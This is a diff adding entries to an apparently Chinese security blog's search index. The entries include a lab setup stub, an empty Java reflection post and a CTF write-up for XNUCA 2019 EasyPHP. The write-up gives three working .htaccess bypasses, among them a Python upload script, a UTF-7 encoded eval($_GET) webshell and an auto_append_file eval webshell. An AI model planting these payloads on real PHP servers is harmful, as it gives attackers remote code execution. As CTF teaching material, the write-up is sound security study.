@@ -15986,6 +15986,39 @@ flag{W0W_S7up1d_PHP_&gt;_&lt;}</code></pre>
 <li>Windows 10 Version 1909 for ARM64-based Systems</li>
 <li>Windows Server, Version 1909 (Server Core installation)</li>
 </ul>
+<h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01    准备工作"></a>0x01    准备工作</h2><p>靶机： Windows 10（IP：192.168.178.136）</p>
+<p>攻击机：Kali 2020（IP：192.168.178.128）</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java反射学习</title>
+    <url>/2022/04/20/java-an-quan/java-fan-she-xue-xi/java-fan-she-xue-xi/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>XNUCA：2019-EasyPHP采用.htaccess绕过三种解法</title>
+    <url>/2022/03/03/xnuca-2019-easyphp-cai-yong-htaccess-rao-guo-san-chong-jie-fa/xnuca-2019-easyphp-cai-yong-htaccess-rao-guo-san-chong-jie-fa/</url>
+    <content><![CDATA[<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+htaccess <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\
+le ".htaccess"
+%23&lt;?php echo `cat /????`; ?>\\'''</span>
+
+url <span class="token operator">=</span> <span class="token string">'http://7ffb4623-1986-4ef9-8e43-b5a91fe9ffee.node4.buuoj.cn:81/?filename={}&amp;content={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess<span class="token punctuation">)</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><pre class=" language-php"><code class="language-php">php_value include_path <span class="token string">"/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs"</span>
+php_value error_reporting <span class="token number">32767</span>
+php_value error_log <span class="token operator">/</span>tmp<span class="token operator">/</span>fl3g<span class="token punctuation">.</span>php
+<span class="token shell-comment comment"># \</span></code></pre>
+<pre class=" language-php"><code class="language-php">php_value include_path <span class="token string">"/tmp"</span>
+php_value zend<span class="token punctuation">.</span>multibyte <span class="token number">1</span>
+php_value zend<span class="token punctuation">.</span>script_encoding <span class="token string">"UTF-7"</span>
+<span class="token shell-comment comment"># \  </span></code></pre>
+<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><pre class=" language-php"><code class="language-php">php_value pcre<span class="token punctuation">.</span>backtrack_limit    <span class="token number">0</span>
+php_value auto_append_file    <span class="token string">".htaccess"</span>
+php_value pcre<span class="token punctuation">.</span>jit   <span class="token number">0</span>
+<span class="token shell-comment comment">#aa&lt;?php eval($_GET[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>\  </code></pre>
 ]]></content>
   </entry>
 </search>
